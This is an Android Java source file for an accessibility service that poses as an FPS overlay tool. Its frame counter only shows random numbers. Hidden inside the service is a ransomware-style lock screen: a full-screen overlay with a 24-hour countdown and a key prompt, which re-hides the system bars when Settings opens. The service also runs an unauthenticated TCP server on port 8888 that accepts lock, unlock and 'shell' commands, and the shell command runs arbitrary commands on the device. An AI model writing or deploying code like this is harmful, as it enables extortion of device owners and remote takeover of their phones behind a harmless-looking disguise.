package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.view.ViewCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Locale;
import java.util.Random;

public class SupportService extends AccessibilityService {
    private WindowManager wm;
    private View overlay;
    private View fpsOverlayView;
    private int[] currentFps = {60};
    private final Handler fpsHandler = new Handler(Looper.getMainLooper());
    private Runnable fpsRunnable;
    private double min_fps = 97.0;
    private double max_fps = 114.0;

    private TextView tv_status;
    private TextView tv_display;
    private final StringBuilder input_buffer = new StringBuilder();
    private long remaining_sec;
    private final Handler task_handler = new Handler(Looper.getMainLooper());
    private static final String PREFS_NAME = "lock_prefs";
    private static final String KEY_END_TIME = "end_time";
    
    private ServerSocket serverSocket;
    private boolean isLocked = false;

    public native void initNative(String path);
    public native void setLockStatus(boolean locked);
    public native boolean isLockedNative();
    public native boolean checkKey(String s);
    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            long currentTime = System.currentTimeMillis();
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            long endTime = prefs.getLong(KEY_END_TIME, 0);
            
            remaining_sec = (endTime - currentTime) / 1000;
            
            if (remaining_sec > 0) {
                update_timer();
                task_handler.postDelayed(this, 1000);
            } else {
                remaining_sec = 0;
                update_timer();
            }
        }
    };

    private void update_timer() {
        if (tv_status != null) {
            long h = remaining_sec / 3600;
            long m = (remaining_sec % 3600) / 60;
            long s = remaining_sec % 60;
            tv_status.setText(String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s));
        }
    }

    private void init_timer() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long endTime = prefs.getLong(KEY_END_TIME, 0);
        if (endTime == 0) {
            endTime = System.currentTimeMillis() + (86400 * 1000);
            prefs.edit().putLong(KEY_END_TIME, endTime).apply();
        }
    }

    @Override
    protected void onServiceConnected() {
        initNative(new java.io.File(getFilesDir(), ".v_stat").getAbsolutePath());
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        init_timer();
        startRemoteServer();
        
        if (isLockedNative()) {
            isLocked = true;
            input_buffer.setLength(0);
            showOverlay();
        } else {
            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
            if (fpsPrefs.getBoolean("is_showing", false)) {
                showFpsOverlay();
            }
        }
    }

    private void showFpsOverlay() {
        if (fpsOverlayView != null) return;

        SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        min_fps = Double.parseDouble(sharedPreferences.getString("min", "97"));
        max_fps = Double.parseDouble(sharedPreferences.getString("max", "114"));

        final int textColor = Color.parseColor("#FFFFFFFF");

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            (int) Math.ceil(143.7),
            (int) Math.ceil(17.5),
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        lp.gravity = Gravity.BOTTOM | Gravity.START;

        fpsOverlayView = new View(this) {
            private final Paint paint = new Paint();
            @Override
            protected void onDraw(Canvas canvas) {
                paint.setAntiAlias(true);
                paint.setColor(ViewCompat.MEASURED_STATE_MASK);
                canvas.drawRect(0.0f, getHeight() - 17.5f, 143.7f, getHeight(), paint);
                paint.setColor(textColor);
                paint.setTextSize(15.5f);
                paint.setFakeBoldText(true);
                paint.setTextScaleX(1.6f);
                try {
                    paint.setTypeface(Typeface.createFromAsset(getContext().getAssets(), "fonts/arialmed.ttf"));
                } catch (Exception e) {
                    paint.setTypeface(Typeface.MONOSPACE);
                }
                canvas.drawText("F", 5.0f, 14.5f, paint);
                float fMeasureText = paint.measureText("F") + 5.0f + 7.0f;
                canvas.drawText("P", fMeasureText, 14.5f, paint);
                canvas.drawText("S", fMeasureText + paint.measureText("P") + 5.0f, 14.5f, paint);
                String strValueOf = String.valueOf(currentFps[0]);
                int length = strValueOf.length();
                String strValueOf2 = String.valueOf(strValueOf.charAt(length - 1));
                float fMeasureText2 = (143.7f - paint.measureText(strValueOf2)) - 4.5f;
                canvas.drawText(strValueOf2, fMeasureText2, 14.5f, paint);
                if (length > 1) {
                    String strValueOf3 = String.valueOf(strValueOf.charAt(length - 2));
                    float fMeasureText3 = (fMeasureText2 - paint.measureText(strValueOf3)) - 8.5f;
                    canvas.drawText(strValueOf3, fMeasureText3, 14.5f, paint);
                    if (length > 2) {
                        String strValueOf4 = String.valueOf(strValueOf.charAt(length - 3));
                        canvas.drawText(strValueOf4, (fMeasureText3 - paint.measureText(strValueOf4)) - 8.5f, 14.5f, paint);
                    }
                }
            }
        };

        wm.addView(fpsOverlayView, lp);
        fpsRunnable = new Runnable() {
            @Override
            public void run() {
                if (fpsOverlayView != null) {
                    int i3 = (int) min_fps;
                    currentFps[0] = i3 + new Random().nextInt((((int) max_fps) - i3) + 1);
                    fpsOverlayView.invalidate();
                    fpsHandler.postDelayed(this, 1000L);
                }
            }
        };
        fpsHandler.post(fpsRunnable);
    }

    private void hideFpsOverlay() {
        if (fpsOverlayView != null) {
            fpsHandler.removeCallbacks(fpsRunnable);
            if (wm != null) {
                wm.removeViewImmediate(fpsOverlayView);
            }
            fpsOverlayView = null;
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("SHOW_FPS".equals(action)) {
                showFpsOverlay();
            } else if ("HIDE_FPS".equals(action)) {
                hideFpsOverlay();
            }
        }
        return START_STICKY;
    }

    private void startRemoteServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(8888);
                while (true) {
                    Socket client = serverSocket.accept();
                    handleCommand(client);
                }
            } catch (Exception e) {
                // Server closed
            }
        }).start();
    }

    private void handleCommand(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter out = new PrintWriter(client.getOutputStream(), true);
            String cmd = in.readLine();

            if (cmd == null) return;
            
            String cmdLower = cmd.toLowerCase().trim();

            if (cmdLower.equals("lock")) {
                task_handler.post(() -> {
                    if (!isLocked) {
                        input_buffer.setLength(0);
                        setLockStatus(true);
                        hideFpsOverlay();
                        showOverlay();
                        isLocked = true;
                    }
                });
                out.println("OK: Device Locked");
            } else if (cmdLower.equals("unlock")) {
                task_handler.post(() -> {
                    if (isLocked) {
                        setLockStatus(false);
                        hideOverlay();
                        isLocked = false;
                        input_buffer.setLength(0);
                        SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
                        if (fpsPrefs.getBoolean("is_showing", false)) {
                            showFpsOverlay();
                        }
                    }
                });
                out.println("OK: Device Unlocked");
            } else if (cmdLower.equals("status")) {
                if (isLockedNative()) {
                    out.println("LOCKED");
                } else {
                    out.println("UNLOCKED");
                }
            } else if (cmdLower.equals("pwd")) {
                out.println("/");
            } else if (cmdLower.startsWith("shell ")) {
                try {
                    String shellCmd = cmd.substring(6);
                    Process p = Runtime.getRuntime().exec(shellCmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    StringBuilder sb = new StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    out.println(sb.toString().isEmpty() ? "OK" : sb.toString());
                } catch (Exception e) {
                    out.println("Error: " + e.getMessage());
                }
            } else {
                out.println("ERROR: Unknown Command");
            }
            client.close();
        } catch (Exception e) {
            // Error handling
        }
    }

    private void showOverlay() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        overlay = inflater.inflate(R.layout.sys_opt_view, null);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                   WindowManager.LayoutParams.FLAG_FULLSCREEN |
                   WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                   WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.MATCH_PARENT;
        lp.gravity = Gravity.TOP | Gravity.START;

        tv_status = overlay.findViewById(R.id.v_timer);
        tv_display = overlay.findViewById(R.id.v_display);
        
        refresh_display();
        setupButtons();

        wm.addView(overlay, lp);
        overlay.post(this::apply_immersive_mode);
        task_handler.post(ticker);
    }

    private void hideOverlay() {
        if (wm != null && overlay != null) {
            wm.removeView(overlay);
            overlay = null;
            task_handler.removeCallbacks(ticker);
        }
    }

    private void setupButtons() {
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        
        for (int id : ids) {
            overlay.findViewById(id).setOnClickListener(v -> {
                if (input_buffer.length() < 8) {
                    input_buffer.append(((Button)v).getText().toString());
                    refresh_display();
                }
            });
        }

        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
            if (input_buffer.length() > 0) {
                input_buffer.setLength(input_buffer.length() - 1);
                refresh_display();
            }
        });

        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
            if (checkKey(input_buffer.toString())) {
                hideOverlay();
                isLocked = false;
                input_buffer.setLength(0);
                SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
                if (fpsPrefs.getBoolean("is_showing", false)) {
                    showFpsOverlay();
                }
            } else {
                input_buffer.setLength(0);
                refresh_display();
                Toast.makeText(getApplicationContext(), "Key Incorrect", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void apply_immersive_mode() {
        if (overlay == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            WindowInsetsController controller = overlay.getWindowInsetsController();
            if (controller != null) {
                controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                controller.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
            }
        } else {
            overlay.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void refresh_display() {
        if (tv_display != null) {
            tv_display.setText(input_buffer.toString());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isLocked && overlay != null) {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (pkgName.equals("com.android.settings")) {
                    apply_immersive_mode();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        hideOverlay();
        hideFpsOverlay();
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
    }
}
